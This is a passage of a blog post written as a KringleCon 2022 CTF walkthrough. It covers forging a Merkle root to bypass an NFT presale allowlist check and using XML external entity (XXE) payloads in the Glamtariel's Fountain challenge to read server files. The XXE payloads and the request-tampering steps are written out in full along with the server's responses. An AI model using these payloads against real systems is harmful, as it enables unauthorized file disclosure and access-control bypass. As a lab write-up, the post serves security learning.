</span></span><span style=display:flex><span>    leaves<span style=color:#f92672>.</span>append(Web3<span style=color:#f92672>.</span>solidityKeccak([<span style=color:#e6db74>&#39;bytes&#39;</span>], [address]))
</span></span><span style=display:flex><span>mt <span style=color:#f92672>=</span> MerkleTreeKeccak(leaves)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># --{snip}--</span>
</span></span></code></pre></div><p>Alternatively, we could have come up with our own script since we have access
to the <code>BSRS_nft.sol</code> smart contract from the second block via the Blockchain
Explorer. For now, we let the script churn by running <code>python merkle_tree.py</code></p><pre tabindex=0><code>Root: 0xde6cdd25ab403f7062c14fabdcd0708340b345adb046875b067ecd8c499cab0e
Proof: [&#39;0x3ca7b0f306be105d5e5b040af0e2bc35fb95026afcd89f726e8e94994c312f79&#39;]
</code></pre><p>We can use these values in the presale page. On the presale page itself, we
open devtools and go to the network tab. We the paste our wallet address and
proof into the field and hit <code>go</code>. We will see a post request fly through. Now
we right click on the request and choose <code>Edit and resend</code> (I&rsquo;m using Firefox
but I believe other browsers support this too). In the request body, replace
the <code>Root</code> value with the one we forged and send it.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{<span style=color:#f92672>&#34;Response&#34;</span>: <span style=color:#e6db74>&#34;You&#39;re on the list and good to go! Now... BUY A SPORC!&#34;</span>}
</span></span></code></pre></div><p>If you don&rsquo;t get a response like the one above, try again with a different
owner address. Once we get a response like this, we resend the same request
with the <code>Validate</code> field set to <code>false</code>. That completes exploiting the The
Bored Sporc Rowboat Society smart contract to buy a sporc for ourselves.</p><h3 id=glamtariels-fountain>Glamtariel&rsquo;s Fountain</h3><p>In this challenge, we feed each of the four images to Glamtariel and the fountain by dragging and dropping.</p><p><img src=../../kringlecon/2022/Screenshot-from-2022-12-12-10-19-08.png alt=Screenshot-from-2022-12-12-10-19-08.png></p><p>They give us hints in ALL CAPS. One of these is TRAFFIC FLIES which hints us on
inspecting the web traffic. We&rsquo;ll keep our browser&rsquo;s devtools network tab open
for good measure. Another hint is the word PATH which refers to a valid path we
have to use later. Glamtariel also talks about not TAMPERing with the cookies
and that is for good reason. If we try tampering with them, we are forced to
start over. Once a new set of images appear, we repeat the drag&rsquo;n&rsquo;drop scheme.</p><p><img src=../../kringlecon/2022/Screenshot-from-2022-12-11-21-39-39.png alt=Screenshot-from-2022-12-11-21-39-39.png></p><p>Midway through we see a strange eye image which Fountains asks us to click
away. In the devtools network tab, we can right click on the image&rsquo;s request
and open it in a new tab. The image path is
<code>/static/images/stage2ring-eyecu_2022.png</code>.</p><p><img src=../../kringlecon/2022/stage2ring-eyecu_2022.png alt=stage2ring-eyecu_2022.png></p><p>Fountain drops a hint about the word APP. We now get a third set of items, four
rings. We do the same drag&rsquo;n&rsquo;drop scheme. Now Glamtariel tells us about a
RINGLIST file. She tells us about a different TYPE of language she speaks. She
also tells us that she keeps her RINGLIST file in a SIMPLE FORMAT.</p><p>Having solved all the Boria Mine Door pins, we get a hint about an XML external
entity attack. Let&rsquo;s do another drag&rsquo;n&rsquo;drop and watch the network requests. We
see a POST request flying through. We can right click on the request and choose
<code>Edit and resend</code>.</p><p><img src=../../kringlecon/2022/Screenshot-from-2022-12-11-21-43-35.png alt=Screenshot-from-2022-12-11-21-43-35.png></p><p>Referring to the TYPE hint as well as the Boria Mine Door XXE hint, we will
replace the request&rsquo;s JSON body &mldr;</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{<span style=color:#f92672>&#34;imgDrop&#34;</span>:<span style=color:#e6db74>&#34;img2&#34;</span>,<span style=color:#f92672>&#34;who&#34;</span>:<span style=color:#e6db74>&#34;princess&#34;</span>,<span style=color:#f92672>&#34;reqType&#34;</span>:<span style=color:#e6db74>&#34;json&#34;</span>}
</span></span></code></pre></div><p>&mldr; with XML. We will also use an XXE payload in the body.</p><p><img src=../../kringlecon/2022/Screenshot-from-2022-12-11-21-49-36.png alt=Screenshot-from-2022-12-11-21-49-36.png></p><p>The body should now look like the following:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; ?&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE imgDrop [&lt;!ENTITY xxe SYSTEM &#34;file:///app/static/images/ringlist.txt&#34; &gt;</span>]&gt;
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;root&gt;</span>
</span></span><span style=display:flex><span> <span style=color:#f92672>&lt;imgDrop&gt;</span>&amp;xxe;<span style=color:#f92672>&lt;/imgDrop&gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>&lt;who&gt;</span>princess<span style=color:#f92672>&lt;/who&gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>&lt;reqType&gt;</span>xml<span style=color:#f92672>&lt;/reqType&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/root&gt;</span>
</span></span></code></pre></div><p>Here&rsquo;s how the XXE works. The <code>xxe</code> entity in the DOCTYPE definiton fetches the
file at the location <code>/app/static/images/ringlist.txt</code> and we use this <code>&amp;xxe;</code>
entity as replacement for the contents of the <code>imgDrop</code> tag.</p><p>A valid question would be: why use the path &ldquo;app/static/images/ringlist.txt&rdquo;?</p><p>First, if we look at any of the response headers, we see the header</p><pre tabindex=0><code>&#34;server&#34;: &#34;Werkzeug/2.2.2 Python/3.10.8&#34;
</code></pre><p>Which, with the hint about APP, tells us that we are dealing with a flask app. Second, we are using the <code>static/images</code> path because we saw that from the eye image earlier. Finally, we are using the <code>txt</code> extension because princess Glamtariel told us that she uses a simple SIMPLE FORMAT to store her ringlist.</p><p>Well, that was a lot of explanation, wasn&rsquo;t it?</p><p>Before sending the request, we must change the TYPE, i. e., the content type to <code>application/xml</code>.</p><p><img src=../../kringlecon/2022/Screenshot-from-2022-12-11-21-51-20.png alt=Screenshot-from-2022-12-11-21-51-20.png></p><p>Firing the request, we get the following response:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;appResp&#34;</span>: <span style=color:#e6db74>&#34;Ah, you found my ring list! Gold, red, blue - so many colors! Glad I don&#39;t keep any secrets in it any more! Please though, don&#39;t tell anyone about this.^She really does try to keep things safe. Best just to put it away. (click)&#34;</span>,
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;droppedOn&#34;</span>: <span style=color:#e6db74>&#34;none&#34;</span>,
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;visit&#34;</span>: <span style=color:#e6db74>&#34;static/images/pholder-morethantopsupersecret63842.png,262px,100px&#34;</span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>We visit the site at the path <code>static/images/pholder-morethantopsupersecret63842.png</code> which shows us the image of a folder with the title <code>x_phial_pholder</code>.</p><p><img src=../../kringlecon/2022/pholder-morethantopsupersecret63842.png alt=pholder-morethantopsupersecret63842.png></p><p>We try requesting files like <code>app/static/images/x_phial_pholder/redring.txt</code>, <code>app/static/images/x_phial_pholder/bluering.txt</code> and <code>app/static/images/x_phial_pholder/silverring.txt</code>. For this, we repurpose the previous XXE technique replacing the filepath along the way.</p><p>The silver ring request with the body</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; ?&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE imgDrop [&lt;!ENTITY xxe SYSTEM &#34;file:///app/static/images/x_phial_pholder_2022/silverring.txt&#34;&gt;</span>]&gt;
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;root&gt;</span>
</span></span><span style=display:flex><span> <span style=color:#f92672>&lt;imgDrop&gt;</span>&amp;xxe;<span style=color:#f92672>&lt;/imgDrop&gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>&lt;who&gt;</span>princess<span style=color:#f92672>&lt;/who&gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>&lt;reqType&gt;</span>xml<span style=color:#f92672>&lt;/reqType&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/root&gt;</span>
</span></span></code></pre></div><p>gets us the following response:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;appResp&#34;</span>: <span style=color:#e6db74>&#34;I&#39;d so love to add that silver ring to my collection, but what&#39;s this? Someone has defiled my red ring! Click it out of the way please!.^Can&#39;t say that looks good. Someone has been up to no good. Probably that miserable Grinchum!&#34;</span>,
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;droppedOn&#34;</span>: <span style=color:#e6db74>&#34;none&#34;</span>,
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;visit&#34;</span>: <span style=color:#e6db74>&#34;static/images/x_phial_pholder_2022/redring-supersupersecret928164.png,267px,127px&#34;</span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>We visit
<code>static/images/x_phial_pholder_2022/redring-supersupersecret928164.png</code> and see
a red ring with text on it saying <code>goldring_to_be_deleted.txt</code>.</p><p><img src=../../kringlecon/2022/redring-supersupersecret928164.png alt=redring-supersupersecret928164.png></p><p>By this time, we know the drill, we have to exfiltrate the contents of this
file. So we use the path
<code>static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; ?&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE imgDrop [&lt;!ENTITY xxe SYSTEM &#34;file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt&#34; &gt;</span>]&gt;
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;root&gt;</span>
</span></span><span style=display:flex><span> <span style=color:#f92672>&lt;imgDrop&gt;</span>&amp;xxe;<span style=color:#f92672>&lt;/imgDrop&gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>&lt;who&gt;</span>princess<span style=color:#f92672>&lt;/who&gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>&lt;reqType&gt;</span>xml<span style=color:#f92672>&lt;/reqType&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/root&gt;</span>
</span></span></code></pre></div><p>We get the response:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;appResp&#34;</span>: <span style=color:#e6db74>&#34;Hmmm, and I thought you wanted me to take a look at that pretty silver ring, but instead, you&#39;ve made a pretty bold REQuest. That&#39;s ok, but even if I knew anything about such things, I&#39;d only use a secret TYPE of tongue to discuss them.^She&#39;s definitely hiding something.&#34;</span>,
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;droppedOn&#34;</span>: <span style=color:#e6db74>&#34;none&#34;</span>,
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;visit&#34;</span>: <span style=color:#e6db74>&#34;none&#34;</span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>After this, I was stuck and resorted to contacting the creator of the challenge
for hints. The creator told me that the value for <code>imgDrop</code> must be what the
princess wants and the <code>reqType</code> must be the XXE to the gold ring itself (get
it? <code>REQ</code> <code>TYPE</code>?). <code>imgDrop</code> should have the name of the ring that the
princess wished for before we changed the request from JSON to XML.</p><p><img src=../../kringlecon/2022/Screenshot-from-2022-12-11-21-40-24.png alt=Screenshot-from-2022-12-11-21-40-24.png></p><p>We know that the princess wants the silver ring, evident from her dialogues.
when we drag&rsquo;n&rsquo;drop the silver ring to the princess, there is a post request
with the <code>imgDrop</code> as <code>img1</code>. Thus, we have to set <code>imgDrop</code> to <code>img1</code>.</p><p>Honestly, it seemed like a huge leap in logic but reading the earlier response,
the princess explicitly tells us that she thought we wanted her to look at the
silver ring.</p><p>Now the payload becomes the following:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; ?&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE imgDrop [&lt;!ENTITY xxe SYSTEM &#34;file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt&#34; &gt;</span>]&gt;
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;root&gt;</span>
</span></span><span style=display:flex><span> <span style=color:#f92672>&lt;imgDrop&gt;</span>img1<span style=color:#f92672>&lt;/imgDrop&gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>&lt;who&gt;</span>princess<span style=color:#f92672>&lt;/who&gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>&lt;reqType&gt;</span>&amp;xxe;<span style=color:#f92672>&lt;/reqType&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/root&gt;</span>
</span></span></code></pre></div><p>which returns the following:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;appResp&#34;</span>: <span style=color:#e6db74>&#34;No, really I couldn&#39;t. Really? I can have the beautiful silver ring? I shouldn&#39;t, but if you insist, I accept! In return, behold, one of Kringle&#39;s golden rings! Grinchum dropped this one nearby. Makes one wonder how &#39;precious&#39; it really was to him. Though I haven&#39;t touched it myself, I&#39;ve been keeping it safe until someone trustworthy such as yourself came along. Congratulations!^Wow, I have never seen that before! She must really trust you!&#34;</span>,
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;droppedOn&#34;</span>: <span style=color:#e6db74>&#34;none&#34;</span>,
</span></span><span style=display:flex><span>  <span style=color:#f92672>&#34;visit&#34;</span>: <span style=color:#e6db74>&#34;static/images/x_phial_pholder_2022/goldring-morethansupertopsecret76394734.png,200px,290px&#34;</span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p><img src=../../kringlecon/2022/goldring-morethansupertopsecret76394734.png alt=goldring-morethansupertopsecret76394734.png></p><p>We paste the name of this file <code>goldring-morethansupertopsecret76394734.png</code> in
our objective and that finishes this challenge. Moral: don&rsquo;t underestimate NPC
dialogues.</p></section></article><footer class=post-tags data-pagefind-meta=tags><a href=https://lavafroth.is-a.dev/tags/binary-exploitation class=list-tag>Binary Exploitation</a>
<a href=https://lavafroth.is-a.dev/tags/ci-exploitation class=list-tag>CI Exploitation</a>
<a href=https://lavafroth.is-a.dev/tags/cloud-security class=list-tag>Cloud Security</a>
<a href=https://lavafroth.is-a.dev/tags/cryptography class=list-tag>Cryptography</a>
<a href=https://lavafroth.is-a.dev/tags/ctf class=list-tag>CTF</a>
<a href=https://lavafroth.is-a.dev/tags/powershell class=list-tag>PowerShell</a>
<a href=https://lavafroth.is-a.dev/tags/reverse-engineering class=list-tag>Reverse Engineering</a>
<a href=https://lavafroth.is-a.dev/tags/web class=list-tag>Web</a>
<a href=https://lavafroth.is-a.dev/tags/wireshark class=list-tag>Wireshark</a></footer><nav class=post-nav><a class=prev href=https://lavafroth.is-a.dev/post/picoctf-web-some-assembly-required-3/><span>←</span><span>Some Assembly Required 3</span></a>
<a class=next href=https://lavafroth.is-a.dev/post/picoctf-cryptography-pixelated/><span>Pixelated</span><span>→</span></a></nav></main><footer class=footer><p>&copy; 2025 <a href=https://lavafroth.is-a.dev/>lavafroth</a></p><p><a href=https://github.com/lavafroth/lavafroth.github.io/issues/new/choose>Report an issue</a></p><p><a href=https://github.com/lavafroth/lavafroth.github.io/discussions/>Discuss</a></p><p><a href=https://lavafroth.is-a.dev/privacy>Privacy</a></p><p><a href=https://creativecommons.org/licenses/by-sa/4.0/legalcode>License</a></p></footer></body></html>